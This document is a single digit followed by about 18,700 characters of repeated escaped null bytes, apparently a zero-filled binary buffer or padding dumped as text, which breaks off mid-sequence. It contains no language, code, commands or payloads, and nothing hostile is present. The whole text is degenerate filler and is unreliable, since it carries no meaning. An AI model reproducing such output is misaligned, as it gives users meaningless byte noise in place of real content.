0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x